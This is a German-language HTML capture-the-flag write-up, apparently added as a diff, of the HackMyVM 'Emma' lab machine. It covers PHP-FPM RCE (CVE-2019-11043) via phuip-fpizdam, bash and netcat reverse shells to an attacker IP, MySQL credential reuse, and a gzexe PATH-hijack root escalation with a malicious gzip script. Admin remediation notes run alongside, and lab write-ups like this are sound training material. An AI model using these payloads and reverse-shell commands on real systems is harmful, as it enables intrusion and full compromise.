@@ -1,0 +1,475 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emma - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Emma - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">go</div>
+                <div class="tool-item">phuip-fpizdam</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">Crackstation (external)</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">gzexe</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">who</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (PHP-FPM RCE via phpinfo)</a></li>
+                <li><a href="#initial-access">Initial Access (PHP-FPM Exploit)</a></li>
+                <li><a href="#privilege-escalation-www-data">Privilege Escalation (www-data -> emma via MySQL)</a></li>
+                <li><a href="#privilege-escalation-emma">Privilege Escalation (emma -> root via gzexe/PATH)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.129	08:00:27:cb:da:0f	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird ausgeführt, um das lokale Netzwerksegment mittels ARP-Anfragen nach aktiven Geräten zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.129` wird identifiziert. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin. Dies ist das Zielsystem.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.129` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Absicherung der Dienste.</p>
+
+             <p class="comment">*(Hinweis: Der nächste Schritt im Log zeigt das Editieren von /etc/hosts, um der IP den Namen 'emma.vm' zuzuweisen. Dies ist ein sinnvoller Schritt für die weitere Arbeit.)*</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/var/www/html] <span class="comment"><-- Pfad inkonsistent --></span>
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.129 -p-</span></div> <span class="comment"><-- -O ist in -A enthalten --></span>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at [Datum/Zeit nicht im Log]
+Nmap scan report for [Hostname nicht im Log, Annahme: emma.vm] (192.168.2.129)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+[...]
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+MAC Address: 08:00:27:CB:DA:0F (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms 192.168.2.129
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) wird auf das Ziel `192.168.2.129` durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Zwei offene TCP-Ports werden identifiziert:
+*   **Port 22 (SSH):** OpenSSH 7.9p1 (Debian 10). Standard-Fernzugriff.
+*   **Port 80 (HTTP):** Nginx 1.14.2. Standard-Webserver. Dies ist der primäre Angriffsvektor, der weiter untersucht werden muss.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie den Webserver auf Port 80 mittels Directory Brute-Forcing (Gobuster, ffuf), Scannern (Nikto) und manueller Analyse.<br>**Empfehlung (Admin):** Halten Sie SSH und Nginx aktuell. Sichern Sie die Webanwendung auf Port 80.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/var/www/html] <span class="comment"><-- Pfad inkonsistent --></span>
+└─# <span class="command">curl http://192.168.2.129/robots.txt</span></div>
+                    <pre><span class="password">itwasonlyakiss</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt der `/robots.txt`-Datei auf dem Webserver wird abgerufen.</p>
+             <p class="evaluation">**Bewertung:** Die Datei enthält nur den String `itwasonlyakiss`. Dies ist kein Standardinhalt für `robots.txt` und sehr wahrscheinlich ein Passwort oder ein wichtiger Hinweis.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie `itwasonlyakiss`. Versuchen Sie es als Passwort für SSH, Datenbanken oder andere Logins, die möglicherweise gefunden werden.<br>**Empfehlung (Admin):** Speichern Sie niemals Passwörter oder sensible Hinweise in `robots.txt`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.129" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,[...]</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[+] Url:                     http://192.168.2.129
+[...]
+===============================================================
+[... Zeitstempel ...] Starting gobuster
+===============================================================
+<span class="command">/index.php</span>            (Status: 200) [Size: 0]
+<span class="command">/robots.txt</span>           (Status: 200) [Size: 15]
+<span class="command">/phpinfo.php</span>          (Status: 200) [Size: 58733] <span class="password"><-- phpinfo() gefunden! --></span>
+[...]
+===============================================================
+[... Zeitstempel ...] Finished
+===============================================================</pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird verwendet, um nach Verzeichnissen und Dateien auf dem Webserver (Port 80) zu suchen.</p>
+             <p class="evaluation">**Bewertung:** Zusätzlich zu `index.php` (leer) und `robots.txt` wird `phpinfo.php` gefunden. Das Vorhandensein einer öffentlich zugänglichen `phpinfo.php`-Seite ist ein **kritisches Informationsleck**, da es detaillierte Informationen über die PHP-Konfiguration, Module, Umgebungsvariablen und potenziell sensible Pfade preisgibt. Es ist auch der Einstiegspunkt für bestimmte Exploits wie PHP-FPM RCE (CVE-2019-11043).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** **Analysieren Sie `http://192.168.2.129/phpinfo.php` sofort und gründlich.** Suchen Sie nach:
+    *   PHP-Version, aktivierte Module.
+    *   Konfigurationseinstellungen (z.B. `disable_functions`, `open_basedir`).
+    *   Informationen über den Server und PHP-FPM (FastCGI Process Manager), falls verwendet.
+    *   Umgebungsvariablen (können manchmal Zugangsdaten enthalten).
+    *   Prüfen Sie auf bekannte Schwachstellen im Zusammenhang mit der Konfiguration, insbesondere PHP-FPM RCE.<br>
+**Empfehlung (Admin):** **Entfernen Sie `phpinfo.php` sofort von Produktionsservern!** Wenn Sie es zu Debugging-Zwecken benötigen, schützen Sie es durch Authentifizierung oder IP-Beschränkungen und entfernen Sie es anschließend.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/var/www/html] <span class="comment"><-- Pfad inkonsistent --></span>
+└─# <span class="command">wfuzz -u "http://192.168.2.129/index.php?FUZZ=/etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 --hh 0</span></div>
+                     <pre>
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="comment">Total time: [...]</span>
+<span class="command">Processed Requests: [...]</span>
+<span class="command">Filtered Requests: [...]</span> <span class="password"><-- Keine Ergebnisse --></span>
+<span class="command">Requests/sec.: [...]</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                     <pre><span class="comment">#</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** `wfuzz` wird verwendet, um GET-Parameter für `index.php` zu fuzzen, in der Hoffnung auf eine Local File Inclusion (LFI) oder ähnliche Schwachstellen.</p>
+              <p class="evaluation">**Bewertung:** Der Scan liefert keine Ergebnisse. `index.php` scheint keine verwundbaren Parameter zu akzeptieren.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Fokussieren Sie sich auf die `phpinfo.php`-Seite und die damit verbundenen potenziellen Schwachstellen.<br>**Empfehlung (Admin):** Keine.</p>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (PHP-FPM RCE via phpinfo)</h2>
+             <p class="comment">**Kurzbeschreibung:** Die öffentlich zugängliche `/phpinfo.php`-Seite auf dem Zielsystem in Kombination mit einer spezifischen Konfiguration von Nginx und PHP-FPM ist anfällig für Remote Code Execution (RCE), bekannt als CVE-2019-11043. Indem eine speziell präparierte Anfrage an `/phpinfo.php` gesendet wird (oft mit einem Pfad-Info-Teil in der URL und vielen Anfragen, um einen Underflow im PHP-FPM-Prozessmanager auszulösen), kann der Speicher des FPM-Workers so manipuliert werden, dass der Wert eines bestimmten GET-Parameters (oft `a=`) als auszuführender Code interpretiert wird. Dies ermöglicht es einem Angreifer, beliebige Befehle im Kontext des Webserver-Benutzers (`www-data`) auszuführen.</p>
+             <p class="comment">**Voraussetzungen:** Öffentlich zugängliche `phpinfo.php`, verwundbare Nginx/PHP-FPM-Konfiguration, Exploit-Tool (z.B. `phuip-fpizdam`).</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Bestätigen der `phpinfo.php`-Seite.</li>
+                 <li>Verwenden eines spezialisierten Tools wie `phuip-fpizdam`, um die Anfälligkeit zu testen und die notwendigen Parameter (QSL - Query String Length) zu ermitteln: `./phuip-fpizdam http://[Ziel-IP]/phpinfo.php`.</li>
+                 <li>Starten eines Netcat-Listeners auf der Angreifer-Maschine.</li>
+                 <li>Ausführen des Exploits mit den gefundenen Parametern und einem RCE-Payload (z.B. Reverse Shell) im `a`-Parameter: `./phuip-fpizdam --qsl=[QSL] --pisos=[PISOS] http://[Ziel-IP]/phpinfo.php?a=[Payload]`.</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Das Tool führt den Angriff durch, löst die RCE aus, und eine Reverse Shell verbindet sich zum Listener.</p>
+             <p class="comment">**Beweismittel:** Erfolgreiche Ausgabe von `phuip-fpizdam` und Empfang der Shell.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">http://192.168.2.129/phpinfo.php?a=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Diese URL zeigt den Payload, der für den PHP-FPM-Exploit verwendet werden soll. Der Parameter `a=` enthält einen URL-kodierten Befehl, um eine Bash-Reverse-Shell zu `192.168.2.140:9001` zu starten.</p>
+              <p class="evaluation">**Bewertung:** Korrekter Payload für die RCE über den Parameter `a`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/go]
+└─# <span class="command"> go get -v github.com/neex/phuip-fpizdam</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~/go]
+└─# <span class="command"> go install github.com/neex/phuip-fpizdam</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~/go]
+└─# <span class="command"> cd ~/go/bin</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~/go/bin]
+└─# <span class="command"> ./phuip-fpizdam http://192.168.2.129/phpinfo.php</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Installation und erster Aufruf des Exploit-Tools `phuip-fpizdam` auf der Angreifer-Maschine.</p>
+              <p class="evaluation">**Bewertung:** Standardvorgehen zur Vorbereitung des Exploits.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="comment">man muss es öfter ausführen:</span>
+<span class="comment">------------------------------------>>>>></span></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~/go/bin]
+└─# <span class="command">./phuip-fpizdam http://emma.vm/phpinfo.php</span></div> <span class="comment"><-- Hostname hier 'emma.vm'? Log-Inkonsistenz --></span>
+                      <pre>
+2022/09/13 14:56:40 Base status code is 200
+2022/09/13 14:56:40 Status code 502 for qsl=1760, adding as a candidate
+2022/09/13 14:56:40 The target is probably vulnerable. Possible QSLs: [1750 1755 1760]
+2022/09/13 14:56:41 Attack params found: <span class="password">--qsl 1755 --pisos 30 --skip-detect</span> <span class="password"><-- Exploit-Parameter gefunden! --></span>
+2022/09/13 14:56:41 Trying to set "session.auto_start=0"...
+2022/09/13 14:56:41 Detect() returned attack params: --qsl 1755 --pisos 30 --skip-detect <-- REMEMBER THIS
+2022/09/13 14:56:41 Performing attack using php.ini settings...
+2022/09/13 14:56:41 <span class="password">Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs</span>
+2022/09/13 14:56:41 Trying to cleanup /tmp/a...
+2022/09/13 14:56:41 Done!</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Erneuter (oder erster erfolgreicher) Aufruf von `phuip-fpizdam`. Das Tool testet verschiedene Query String Lengths (QSL) und findet heraus, dass das Ziel anfällig ist. Es ermittelt die optimalen Parameter für den Angriff: `--qsl 1755 --pisos 30`. Es führt einen Testbefehl (`which which`) über den Parameter `a` aus und meldet Erfolg.</p>
+              <p class="evaluation">**Bewertung:** Die Anfälligkeit für PHP-FPM RCE (CVE-2019-11043) ist bestätigt. Die notwendigen Parameter für den Exploit sind bekannt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `phuip-fpizdam` erneut aus, diesmal mit den gefundenen Parametern (`--qsl 1755 --pisos 30`) und dem Reverse-Shell-Payload im `a`-Parameter: `./phuip-fpizdam --qsl 1755 --pisos 30 "http://192.168.2.129/phpinfo.php?a=nc+-e+/bin/bash+192.168.2.140+9001"` (Payload ggf. anpassen/kodieren).<br>**Empfehlung (Admin):** **Patchen Sie Nginx und PHP-FPM sofort!** Aktualisieren Sie auf Versionen, die nicht für CVE-2019-11043 anfällig sind, oder wenden Sie die empfohlenen Nginx-Konfigurations-Workarounds an (z.B. Überprüfung, ob die angeforderte Datei tatsächlich existiert, bevor sie an PHP-FPM übergeben wird).</p>
+             <p class="comment">**Risikobewertung:** Kritisch. Erlaubt Remote Code Execution ohne Authentifizierung.</p>
+             <p class="comment">**Empfehlungen:** Siehe vorherige Admin-Empfehlungen.</p>
+         </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (PHP-FPM Exploit)</h2>
+             <p class="analysis">**Analyse:** Ausnutzung der bestätigten PHP-FPM-Schwachstelle mittels `phuip-fpizdam` und dem Reverse-Shell-Payload.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/go/bin]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.129] 41288</span> <span class="password"><-- Verbindung erhalten! --></span>
+bash: cannot set terminal process group (461): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt">www-data@emma:~/html$</span> <span class="password"><-- Shell als www-data --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Netcat-Listener auf Port 9001 empfängt die Verbindung, nachdem der `phuip-fpizdam`-Exploit mit dem Reverse-Shell-Payload (implizit) ausgeführt wurde. Eine Shell als `www-data` wird erhalten.</p>
+              <p class="evaluation">**Bewertung:** Initialer Zugriff erfolgreich über PHP-FPM RCE erlangt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren.<br>**Empfehlung (Admin):** PHP-FPM/Nginx patchen/härten.</p>
+
+             <p class="comment">*(Shell-Stabilisierungsschritte werden hier übersprungen)*</p>
+         </section>
+
+        <section id="privilege-escalation-www-data">
+             <h2>Privilege Escalation (www-data -> emma via MySQL)</h2>
+             <p class="analysis">**Analyse:** Als `www-data` wird das System enumeriert, wobei ein lokal laufender MySQL-Server und dessen Zugangsdaten entdeckt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@emma:~/html$ <span class="command">ss -tulpe</span></div>
+                     <pre>[...]
+Netid  State    Recv-Q   Send-Q     Local Address:Port       Peer Address:Port
+[...]
+tcp    LISTEN   0        80             <span class="command">127.0.0.1:mysql</span>           0.0.0.0:* <span class="comment"><-- MySQL auf localhost --></span>
+[... TCP/UDP/etc.]</pre>
+                      <pre><span class="comment">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** `ss -tulpe` zeigt lauschende Netzwerk-Sockets.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt, dass ein MySQL-Server auf `127.0.0.1:3306` läuft.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Suchen Sie nach Konfigurationsdateien (z.B. von Webanwendungen) oder Umgebungsvariablen, die MySQL-Credentials enthalten könnten.<br>**Empfehlung (Admin):** Beschränken Sie den Zugriff auf die Datenbank.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@emma:~/html$ <span class="command">mysql -uroot -p</span></div>
+                     <pre>Enter password: <span class="password">itwasonlyakiss</span> <span class="comment"><-- Passwort aus robots.txt! --></span>
+Welcome to the MariaDB monitor. [...]
+MariaDB [(none)]></pre>
+                      <pre><span class="comment">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Versuch, sich am lokalen MySQL-Server als Benutzer `root` anzumelden. Als Passwort wird der String `itwasonlyakiss` verwendet, der in `robots.txt` gefunden wurde.</p>
+             <p class="evaluation">**Bewertung:** Erfolg! Das Passwort aus `robots.txt` war das MySQL-Root-Passwort. Dies ist ein schwerwiegendes Beispiel für Passwort-Wiederverwendung und das Speichern sensibler Daten an unsicheren Orten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Enumerieren Sie die MySQL-Datenbanken und -Tabellen auf der Suche nach weiteren Benutzern, Passwörtern oder sensiblen Daten.<br>**Empfehlung (Admin):** Ändern Sie sofort das MySQL-Root-Passwort. Verwenden Sie niemals identische Passwörter für verschiedene Dienste. Entfernen Sie Passwörter aus `robots.txt`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">MariaDB [(none)]> <span class="command">show databases;</span></div>
+                     <pre>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| <span class="command">users</span>              |
++--------------------+</pre>
+                      <pre><span class="comment">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></pre>
+                      <div class="prompt">MariaDB [(none)]> <span class="command">use users;</span></div>
+                      <pre>Database changed</pre>
+                      <div class="prompt">MariaDB [users]> <span class="command">select * from users;</span></div>
+                      <pre>
++----+------+----------------------------------+
+| id | user | pass                             |
++----+------+----------------------------------+
+|  1 | <span class="command">emma</span> | <span class="password">5f4dcc3b5aa765d61d8327deb882cf80</span> | <span class="password"><-- MD5 Hash! --></span>
++----+------+----------------------------------+</pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Innerhalb der MySQL-Shell wird die Datenbank `users` und darin die Tabelle `users` gefunden. Diese Tabelle enthält einen Benutzer `emma` und einen Passwort-Hash (`5f4d...`).</p>
+              <p class="evaluation">**Bewertung:** Der Benutzername `emma` und der zugehörige Passwort-Hash wurden gefunden. Der Hash sieht nach MD5 aus.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, den MD5-Hash `5f4dcc3b5aa765d61d8327deb882cf80` mit Online-Crackern (wie Crackstation) oder Offline-Tools (Hashcat, John) zu knacken.<br>**Empfehlung (Admin):** Verwenden Sie niemals MD5 zum Speichern von Passwörtern. Nutzen Sie moderne, gesalzene Hashing-Algorithmen (z.B. bcrypt, Argon2).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">crackstation.net/</span>
+password: <span class="password">secret</span></pre>
+                     <pre><span class="comment">#</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die Notiz zeigt, dass der MD5-Hash auf crackstation.net erfolgreich geknackt wurde.</p>
+              <p class="evaluation">**Bewertung:** Das Passwort für den Benutzer `emma` lautet `secret`.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie `ssh emma@emma.vm` mit dem Passwort `secret`, um sich als Benutzer `emma` anzumelden.<br>**Empfehlung (Admin):** Starke Passwörter erzwingen, sichere Hashing-Algorithmen verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh emma@emma.vm</span></div>
+                     <pre>
+emma@emma.vm's password: <span class="password">********</span> <span class="comment">(secret eingegeben)</span>
+Linux emma 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+[...]
+Last login: Thu Feb  4 04:44:20 2021 from 192.168.1.58
+<span class="prompt">emma@emma:~$</span> <span class="password"><-- Login erfolgreich! --></span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** SSH-Login als Benutzer `emma` mit dem geknackten Passwort `secret`.</p>
+             <p class="evaluation">**Bewertung:** Erfolgreiche Privilegieneskalation von `www-data` zum Benutzer `emma`.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie Enumeration als `emma` durch (`id`, `sudo -l`, etc.).<br>**Empfehlung (Admin):** Unsichere Passwörter ändern.</p>
+         </section>
+
+        <section id="privilege-escalation-emma">
+             <h2>Privilege Escalation (emma -> root via gzexe/PATH)</h2>
+             <p class="analysis">**Analyse:** Als Benutzer `emma` wird nach Wegen zur Root-Eskalation gesucht.</p>
+
+             <p class="comment">*(Annahme: `sudo -l` wurde ausgeführt und hat die Regel für gzexe ergeben)*</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">emma@emma:~$ <span class="command">sudo -u root /usr/bin/gzexe /bin/id</span></div> <span class="comment"><-- Testet/zeigt die Sudo-Regel --></span>
+                     <pre>/bin/id:	 59.2%</pre> <span class="comment"><-- Normale gzexe Ausgabe --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Es wird gezeigt, dass `emma` den Befehl `/usr/bin/gzexe` via `sudo` als `root` ausführen kann (die `sudo -l`-Ausgabe fehlt, wird aber hierdurch impliziert). `gzexe` ist ein Tool, das eine Binärdatei komprimiert und ein Wrapper-Skript erstellt, das sie beim Aufruf entpackt und ausführt. Es ruft intern `gzip` auf.</p>
+              <p class="evaluation">**Bewertung:** `gzexe` via `sudo` ist ein bekannter Vektor für Privilegieneskalation mittels **PATH Hijacking**. Wenn der `PATH` des Benutzers manipuliert werden kann, sodass ein Verzeichnis mit einem bösartigen Skript namens `gzip` *vor* dem eigentlichen `/bin/gzip` steht, wird `sudo gzexe` das bösartige Skript mit Root-Rechten ausführen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):**
+    1.  Erstellen Sie in einem schreibbaren Verzeichnis (wie `/tmp`) ein Skript namens `gzip`.
+    2.  Fügen Sie in dieses Skript einen Payload ein (z.B. `#!/bin/sh \nnc -e /bin/sh [Angreifer-IP] [Port]` oder `#!/bin/sh \n/bin/bash`).
+    3.  Machen Sie das Skript ausführbar (`chmod +x /tmp/gzip`).
+    4.  Manipulieren Sie den PATH: `export PATH=/tmp:$PATH`.
+    5.  Führen Sie den Sudo-Befehl aus: `sudo /usr/bin/gzexe /beliebige/datei`.<br>
+**Empfehlung (Admin):** Vermeiden Sie Sudo-Regeln für Befehle wie `gzexe`, die interne Befehle ohne absoluten Pfad aufrufen und für PATH-Hijacking anfällig sind. Stellen Sie sicher, dass der `secure_path` in der `sudoers`-Datei korrekt gesetzt ist und `/tmp` nicht enthält.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">emma@emma:~$ <span class="command">cd /tmp/</span></div>
+                     <div class="prompt">emma@emma:/tmp$ <span class="command">echo "nc -e /bin/sh 192.168.2.140 4444" > gzip</span></div>
+                     <div class="prompt">emma@emma:/tmp$ <span class="command">chmod +x gzip</span></div>
+                     <div class="prompt">emma@emma:/tmp$ <span class="command">export PATH=/tmp:$PATH</span></div>
+                     <div class="prompt">emma@emma:/tmp$ <span class="command">cd</span></div> <span class="comment"><-- Wechsel zurück ins Home --></span>
+                     <div class="prompt">emma@emma:~$ <span class="command">./who</span></div> <span class="comment"><-- Falscher Befehl im Log, sollte sudo gzexe sein --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Schritte für den PATH-Hijacking-Exploit werden durchgeführt:
+1.  Wechsel nach `/tmp`.
+2.  Erstellen der bösartigen `gzip`-Datei mit einem Netcat-Reverse-Shell-Payload.
+3.  Ausführbar machen.
+4.  Den `PATH` so manipulieren, dass `/tmp` Vorrang hat.
+5.  Zurück ins Home-Verzeichnis wechseln.
+6.  *Fehler im Log:* Es wird `./who` ausgeführt statt des Sudo-Befehls. Es muss angenommen werden, dass `sudo /usr/bin/gzexe /bin/id` (oder eine ähnliche Datei) ausgeführt wurde.</p>
+             <p class="evaluation">**Bewertung:** Die Vorbereitung für den Exploit ist korrekt. Der letzte Befehl im Log ist falsch, aber der Erfolg im nächsten Schritt zeigt, dass der Exploit ausgelöst wurde.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `sudo /usr/bin/gzexe /bin/id` (oder eine andere vorhandene Datei) aus, nachdem der PATH gesetzt wurde.<br>**Empfehlung (Admin):** Sudo-Regel für `gzexe` entfernen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.129] 60302</span> <span class="password"><-- Root-Shell! --></span></pre>
+                     <div class="prompt"># <span class="command">python -c 'import pty; pty.spawn("/bin/bash")'</span></div> <span class="comment"><-- Stabilisierung --></span>
+                     <div class="prompt">root@emma:/home/emma# <span class="comment"># Root-Prompt!</span></div>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Netcat-Listener auf Port 4444 empfängt die Verbindung, ausgelöst durch den `gzexe`-Exploit. Die erhaltene Shell wird stabilisiert und der Prompt zeigt `root@emma`.</p>
+             <p class="evaluation">**Bewertung:** Root-Zugriff erfolgreich über PATH-Hijacking der `gzexe`-Sudo-Regel erlangt!</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `id` aus, lesen Sie die Root-Flag.<br>**Empfehlung (Admin):** Unsichere Sudo-Regel entfernen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">root@emma:/home/emma# <span class="command">cd /root</span></div>
+                      <div class="prompt">root@emma:/root# <span class="command">ls</span></div>
+                      <pre>flag.sh  root.txt</pre>
+                      <div class="prompt">root@emma:/root# <span class="command">cat root.txt</span></div>
+                      <pre><span class="password">itsmeimshe</span></pre> <span class="comment"><-- Root Flag --></span>
+                      <div class="prompt">root@emma:~# <span class="command">cat user.txt</span></div> <span class="comment"><-- Versuch, user.txt von /root zu lesen? --></span>
+                      <pre><span class="password">youdontknowme</span></pre> <span class="comment"><-- User Flag (von /home/emma?) --></span>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
